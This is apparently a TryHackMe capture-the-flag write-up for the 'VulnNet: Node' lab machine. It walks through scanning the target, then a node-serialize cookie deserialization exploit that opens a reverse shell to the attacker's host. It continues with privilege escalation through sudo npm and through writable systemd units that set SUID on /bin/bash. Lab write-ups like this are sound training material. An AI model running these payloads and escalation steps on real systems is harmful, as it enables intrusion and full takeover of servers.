# **VulnNet: Node - TryHackMe**

*Target Ip. Address : 10.48.153.128*

So, Let's start with nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.153.128
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 10:20 +0545
Nmap scan report for 10.48.153.128
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:d8:7f:e7:d9:6f:0d:55:c1:ec:72:a1:fa:bc:72:3e (RSA)
|   256 36:fc:ce:98:a9:d2:48:e4:6b:25:7e:48:98:e6:5e:43 (ECDSA)
|_  256 2b:7e:37:7c:1b:53:3d:9a:3f:d2:cf:f1:74:0b:63:07 (ED25519)
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
```

So, we have 2 ports, port 22 (ssh) and port 8080 (http) with a Node.js Express framework.
Let's visit port 8080.

So, it is like a new website. LEt's use gobuster to see any directories, wec can find.

```bash
kali@kali:gobuster dir -u http://10.48.153.128:8080/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.153.128:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Login                (Status: 200) [Size: 2127]
css                  (Status: 301) [Size: 173] [--> /css/]
img                  (Status: 301) [Size: 173] [--> /img/]
login                (Status: 200) [Size: 2127]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

Not much we find. The login needs a valid credentials. Since, this is a node.js framework and most of the time it is realted to deserialization vulnerability.

Let's see a request in burp-suite, how does it look.

```request
GET / HTTP/1.1
Host: 10.48.153.128:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
Upgrade-Insecure-Requests: 1
If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
Priority: u=0, i
```

So, we have a standard request, nothing much. Let's see the session token. It is base64 encoded, let's decode it.

```bash
kali@kali:echo "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ" | base64 -d
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

Let's see if we can manipulate the session token to be admin.

```bash
kali@kali:echo -n "{"username":"admin","isadmin":true,"encoding": "utf-8"}" | base64 
e3VzZXJuYW1lOmFkbWluLGlzYWRtaW46dHJ1ZSxlbmNvZGluZzogdXRmLTh9
```

Let's try this session token to see if anything happens.

```request
GET / HTTP/1.1
Host: 10.48.153.128:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=e3VzZXJuYW1lOmFkbWluLGlzYWRtaW46dHJ1ZSxlbmNvZGluZzogdXRmLTh9%3D%3D
Upgrade-Insecure-Requests: 1
If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
Priority: u=0, i
```

```response
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1172
Date: Fri, 06 Feb 2026 05:03:40 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token u in JSON at position 1<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)<br> &nbsp; &nbsp;at /home/www/VulnNet-Node/server.js:16:24<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)</pre>
</body>
</html>
```

We were not able to be admin, but we found a critical vulnerability. We can abuse this deserialization vulnerability to possibly get RCE.

We will use this "*https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py*" to generate a reverse shell payload.

Genearate a reverse shell payload.

```bash
kali@kali:python2 nodejsshell.py 192.168.130.26 4444
[+] LHOST = 192.168.130.26
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,........82,84,41,59,10))
```

Now let’s generate the serialized payload and add IIFE brackets after the function body.

```payload
{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,.....82,84,41,59,10))}()"}
```

Encode the payload in base64 format.

```bash
kali@kali:echo -n '{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,.....82,84,41,59,10))}()"}' | base64
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2Rl.....MTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9
```

Start a listener on the attacker machine.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.71 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Edit the session token with the base64 encoded payload, and send the request.

```request
GET / HTTP/1.1
Host: 10.48.153.128:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVu.....ODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9%3D%3D
Upgrade-Insecure-Requests: 1
If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
Priority: u=0, i
```

If everything is correct, you should receive a reverse shell hit on listener.

```bash
kali@kali:penelope -p 4444                                                                                                                   
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.71 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ip-10-48-153-128~10.48.153.128-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/ip-10-48-153-128~10.48.153.128-Linux-x86_64/2026_02_06-11_07_04-380.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www@ip-10-48-153-128:~/VulnNet-Node$ 
```

We get a reverse shell as www-data. Let's see for any escalation vectors.

```bash
www@ip-10-48-153-128:~/VulnNet-Node$ sudo -l
Matching Defaults entries for www on ip-10-48-153-128:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on ip-10-48-153-128:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

So, we can run /usr/bin/npm as user serv-manage.

The process of exploitation can be found here "*https://gtfobins.org/gtfobins/npm/*"

```bash
www@ip-10-48-153-128:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
www@ip-10-48-153-128:~$ sudo -u serv-manage npm -C . i

> @ preinstall /home/www
> /bin/sh

$ id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```

We successfully became users serv-manage.

Let's stabilize this shell and make a good pty.

```bash
$ python3 -c 'import pty; pty.spawn ("/bin/bash")'
serv-manage@ip-10-48-153-128:/home/www$ 
```

The first flag is located at the home directory.

```bash
serv-manage@ip-10-48-153-128:~$ cat user.txt
THM{06.....21}
```

Checking the sudo privileges, we find something interesting.

```bash
serv-manage@ip-10-48-153-128:~$ sudo -l
Matching Defaults entries for serv-manage on ip-10-48-153-128:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on ip-10-48-153-128:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

We can start and stop the vulnnet-auto.timer as well as reload services, as root with sudo without password.

```bash
serv-manage@ip-10-48-153-128:/etc/systemd/system$ ls -la | grep vulnnet
-rw-rw-r--  1 root serv-manage  167 Jan 24  2021 vulnnet-auto.timer
-rw-rw-r--  1 root serv-manage  197 Jan 24  2021 vulnnet-job.service
```

We have both read and write access to both scripts.

```bash
serv-manage@ip-10-48-153-128:/etc/systemd/system$ cat vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

So, this scripts run vulnet-job.service every 30 minutes.

```bash
serv-manage@ip-10-48-153-128:/etc/systemd/system$ cat vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

Now, we can edit those scripts as our wish.

Create a updated scripts on your attacker machine.

```bash
kali@kali:cat vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
OnCalendar=*:0/1
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

This will run the vulnnet-job.service every minute.

```bash
kali@kali:cat vulnnet-job.service 
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer
 
[Service]
Type=forking
ExecStart=chmod +s /bin/bash
 
[Install]
WantedBy=multi-user.target
```

This will make /bin/bash SUID, which we will use to become root.

Start a python server on your attacker machine.

```bash
kali@kali:python3 -m http.server 80                                                                                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

Get those files on the machine. Please note that although you have read write permissions, you have no exclusive permissions on the directory itself. So, you will have to pipe the output of wget into the file directly.

```bash
serv-manage@ip-10-48-153-128:/etc/systemd/system$ wget -O- http://192.168.130.26/vulnnet-auto.timer > vulnnet-auto.timer
--2026-02-06 07:00:30--  http://192.168.130.26/vulnnet-auto.timer
Connecting to 192.168.130.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 155 [application/octet-stream]
Saving to: ‘STDOUT’

-                   100%[===================>]     155  --.-KB/s    in 0s      

2026-02-06 07:00:30 (674 KB/s) - written to stdout [155/155]
```

```bash
serv-manage@ip-10-48-153-128:/etc/systemd/system$ wget -O- http://192.168.130.26/vulnnet-job.service > vulnnet-job.service
--2026-02-06 07:05:01--  http://192.168.130.26/vulnnet-job.service
Connecting to 192.168.130.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 183 [application/octet-stream]
Saving to: ‘STDOUT’

-                   100%[===================>]     183  --.-KB/s    in 0s      

2026-02-06 07:05:01 (998 KB/s) - written to stdout [183/183]
```

Now, we have the scripts ready. Let's stop the script.

```bash
serv-manage@ip-10-48-153-128:/etc/systemd/system$ sudo /bin/systemctl stop vulnnet-auto.timer
```

Now, reload the daemon and restart the service.

```bash
serv-manage@ip-10-48-153-128:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
serv-manage@ip-10-48-153-128:/etc/systemd/system$ sudo /bin/systemctl start vulnnet-auto.timer
```

Wait for the service to run.

```bash
serv-manage@ip-10-48-153-128:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

We now have a SUID /bin/bash. Now, we can escalate to root.

```bash
serv-manage@ip-10-48-153-128:~$ /bin/bash -p
bash-5.0# id
uid=1000(serv-manage) gid=1000(serv-manage) euid=0(root) egid=0(root) groups=0(root),1000(serv-manage)
```

Read the final flag at root directory and complete this challenge.

```bash
bash-5.0# cat root.txt
THM{ab.....f9}
```
